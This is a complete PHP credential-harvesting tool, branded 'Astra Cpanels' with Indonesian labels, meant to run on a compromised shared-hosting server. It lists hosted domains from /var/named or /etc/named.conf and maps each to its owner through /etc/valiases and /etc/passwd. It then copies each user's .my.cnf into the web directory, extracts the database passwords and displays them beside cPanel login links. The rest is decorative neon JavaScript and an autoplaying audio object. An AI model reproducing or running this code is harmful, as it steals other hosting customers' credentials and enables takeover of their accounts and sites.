<?php
/**
Coded By Astra
Edited By Astra
Copyright By Astra
O AJA Y GAN
Muehehehe
**/

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<html><head>
<title>Astra Cpanels</title>
<meta content="text/html; charset=utf-8">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: lime ; font-size:10px }
A:link {text-decoration: none;color: red;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: aqua;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style>
<link rel="SHORTCUT ICON" href="https://blog.rootshell.be/wp-content/uploads/2012/02/blackhat-nl.png"><center> 
</head><body>';
echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 66px black, 0 0 5px black, 0 0 5px black;color: dodgerblue">..::[  CPanel Open Server ]::.. <br /></div><br/>';


$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":/cpanel' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo '<center>';
echo "<a href=\"http://www.magelang1337.com\"><img class=\"logo\" src=\"https://3.bp.blogspot.com/-kqyfUPouqYk/VtYS0lU-ufI/AAAAAAAAADw/5707sF1NYwo/s1600/MemImg402.gif\" alt=\"Mionoon,..\"></a><br><br>\n";
echo "<div class='result'><i><font color='#FF0000'>Server ini Tidak Bisa</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf </font>Tidak Di temukan </i></div><br></center>";
}
echo'
<body>
<style type="text/css">     
  body { 
     
     
    
     
    background: black url("http://deko.lt/lab/tutorials/DustLight/DustLight_alpha.jpg");
     
     
     
     
    background-repeat: repeat;
     
    
     
     
    background-position: cright;
     
     
     
     
    background-attachment: fixed;
     
     
    }
     
     
     
     
    </style>';
echo '<center>';
echo "<script language=\"JavaScript1.2\">\n"; 
echo "var message=\" Copyright © 2017 Astra\  \"// jangan pakai enter\n"; 
echo "var neonbasecolor=\" black \"\n"; 
echo "var neontextcolor=\" blue \"\n"; 
echo "var neontextcolor2=\"green\"  // kode warna kedua\n"; 
echo "var flashspeed=5	// kecepatan flash neon, semakin kecil semakin cepat\n"; 
echo "var flashingletters=10	// jumlah huruf yang tersorot oleh flash\n"; 
echo "var flashingletters2=2	// jumlah warna di ekor flash\n"; 
echo "var flashpause=1					\n"; 
echo "///edit by Astra/\n"; 
echo "var n=0\n"; 
echo "if (document.all||document.getElementById){\n"; 
echo "document.write('<font color=\"'+neonbasecolor+'\">')\n"; 
echo "for (m=0;m<message.length;m++)\n"; 
echo "document.write('<span id=\"neonlight'+m+'\">'+message.charAt(m)+'</span>')\n"; 
echo "document.write('</font>')\n"; 
echo "}\n"; 
echo "else\n"; 
echo "document.write(message)\n"; 
echo "function crossref(number){\n"; 
echo "var crossobj=document.all? eval(\"document.all.neonlight\"+number) : document.getElementById(\"neonlight\"+number)\n"; 
echo "return crossobj\n"; 
echo "}\n"; 
echo "function neon(){\n"; 
echo "//Change all letters to base color\n"; 
echo "if (n==0){\n"; 
echo "for (m=0;m<message.length;m++)\n"; 
echo "crossref(m).style.color=neonbasecolor\n"; 
echo "}\n"; 
echo "//cycle through and change individual letters to neon color\n"; 
echo "crossref(n).style.color=neontextcolor\n"; 
echo "\n"; 
echo "if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 \n"; 
echo "if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor\n"; 
echo "if (n<message.length-1)\n"; 
echo "n++\n"; 
echo "else{\n"; 
echo "n=0\n"; 
echo "clearInterval(flashing)\n"; 
echo "setTimeout(\"beginneon()\",flashpause)\n"; 
echo "return\n"; 
echo "}\n"; 
echo "}\n"; 
echo "function beginneon(){\n"; 
echo "if (document.all||document.getElementById)\n"; 
echo "flashing=setInterval(\"neon()\",flashspeed)\n"; 
echo "}\n"; 
echo "beginneon()\n"; 
echo "</script> </b>\n"; 
echo "<center></center>\n";
echo "</body></html>";
echo '</center>';
echo "<object type=\"application/x-shockwave-flash\" data=\"http://flash-mp3-player.net/medias/player_mp3_maxi.swf\" width=\"0\" height=\"0\">\n"; 
echo "    <param name=\"movie\" value=\"http://flash-mp3-player.net/medias/player_mp3_maxi.swf\" />\n"; 
echo "    <param name=\"bgcolor\" value=\"#ffffff\" />\n"; 
echo "    <param name=\"FlashVars\" value=\"mp3=https%3A//hshmp3oke.googlecode.com/svn/HsH-Login.mp3&amp;width=0&amp;height=0&amp;autoplay=1&amp;volume=200\" />\n"; 
echo "</object>	\n";
?>
